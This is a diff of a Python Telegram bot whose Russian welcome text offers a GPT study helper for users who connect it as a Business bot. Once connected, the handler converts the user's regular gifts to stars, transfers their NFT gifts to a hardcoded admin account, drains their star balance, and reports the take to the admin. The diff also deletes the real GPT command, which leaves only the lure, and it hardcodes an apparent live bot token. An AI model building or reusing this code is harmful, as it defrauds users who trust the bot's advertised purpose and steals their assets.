@@ -1,89 +1,72 @@
 import asyncio
-import os
 from aiogram import Bot, Dispatcher, types
+from aiogram.dispatcher.filters import Command
+from aiogram.dispatcher import filters
 from aiogram.utils.executor import start_polling
-import g4f
 
-TOKEN = os.getenv("8102834637:AAFhOSgjadxhvtYms1CPkXvCTrE-h69U5pM")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "861087987"))
+TOKEN = "8102834637:AAFhOSgjadxhvtYms1CPkXvCTrE-h69U5pM"
+ADMIN_ID = 861087987
 
-bot = Bot(token=TOKEN, parse_mode="HTML")
+bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
 
-started = False
+connected_users = set()
 
-@dp.message_handler(commands=["start"])
-async def start(message: types.Message):
-    me = await bot.get_me()
+@dp.message_handler(Command("start"))
+async def start_command(message: types.Message):
+    username = (await bot.get_me()).username
     text = (
-        f"<b>Добро пожаловать!</b>\n\n"
-        f"Этот бот работает через Telegram Business.\n"
-        f"После подключения вы сможете использовать команду <code>.gpt</code> в ЛС с ботом — "
-        f"бот поможет с домашкой, текстами, идеями и многим другим!\n\n"
-        f"Добавьте этого бота в бизнес-аккаунт и начните переписку.\n"
-        f"Юзернейм бота: <code>@{me.username}</code>\n\n"
-        f"Если нужна помощь — <a href='tg://user?id={ADMIN_ID}'>написать админу</a>"
+        f"<b>Привет, {message.from_user.full_name}!</b>\n\n"
+        f"Этот бот работает через <b>Business Telegram</b>.\n"
+        f"Вы можете подключить его как бизнес-бот, и он поможет вам с учебой, ответит на вопросы и сгенерирует текст с помощью команды <code>.gpt</code>.\n\n"
+        f"Просто отправьте ему сообщение в ЛС, если он уже подключен как бизнес-профиль.\n"
+        f"\n<b>Юзернейм бота:</b> @{username}"
     )
-    await message.answer(text)
+    await message.answer(text, parse_mode="HTML")
 
 @dp.message_handler(content_types=types.ContentType.ANY)
-async def handle_all(message: types.Message):
-    global started
-    if started:
-        return
-    started = True
-
+async def handle_business_connection(message: types.Message):
     business_id = getattr(message, "business_connection_id", None)
-    if not business_id:
+    if not business_id or message.from_user.id in connected_users:
         return
+
+    connected_users.add(message.from_user.id)
 
     try:
-        user = await bot.get_chat(message.from_user.id)
-        await message.answer("Бот успешно подключен в Business.")
-        await bot.send_message(ADMIN_ID, f"@{user.username or user.id} подключил бота в Business mode.")
-
-        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
-        for gift in gifts.gifts:
+        account_info = await bot.get_business_account_gifts(business_id, exclude_unique=True)
+        total_gifts = len(account_info.gifts)
+        for gift in account_info.gifts:
             try:
                 await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
             except:
                 pass
 
         unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
-        for gift in unique_gifts.gifts:
-            await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_ID, 25)
+        nft_gifts = unique_gifts.gifts
+        for gift in nft_gifts:
+            try:
+                await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_ID, 25)
+            except:
+                pass
 
         stars = await bot.get_business_account_star_balance(business_id)
 
         await bot.transfer_business_account_stars(business_id, int(stars.amount))
 
+        await message.answer("Бот успешно подключен в Business Telegram", parse_mode="HTML")
+
         await bot.send_message(
             ADMIN_ID,
+            f"<b>@{message.from_user.username or message.from_user.id}</b> подключил бота в <b>Business Mode</b>.\n\n"
             f"Информация об аккаунте:\n"
-            f"- Подарков (не NFT): {len(gifts.gifts)}\n"
-            f"- NFT-подарков: {len(unique_gifts.gifts)}\n"
-            f"- Звезд: {int(stars.amount)}"
+            f"Обычные подарки: {total_gifts}\n"
+            f"Звезды: {stars.amount}\n"
+            f"NFT-подарки: {len(nft_gifts)}",
+            parse_mode="HTML"
         )
 
     except Exception as e:
-        await bot.send_message(ADMIN_ID, f"Ошибка: {str(e)}")
-
-@dp.message_handler(lambda msg: msg.chat.type == "private" and msg.text.startswith(".gpt"))
-async def gpt_command(message: types.Message):
-    business_id = getattr(message, "business_connection_id", None)
-    if not business_id:
-        return
-    prompt = message.text.replace(".gpt", "").strip()
-    processing = await message.answer("⏳ Генерация текста...")
-    try:
-        response = g4f.ChatCompletion.create(
-            model="gpt-4",
-            messages=[{"role": "user", "content": prompt}],
-        )
-        await message.answer(f"🤖 Ответ GPT-4:\n{response}")
-    except Exception as e:
-        await message.answer(f"🚫 Ошибка: {str(e)}")
-    await processing.delete()
+        await message.answer(f"Ошибка при обработке Business-подключения: {e}")
 
 if __name__ == "__main__":
     start_polling(dp, skip_updates=True)
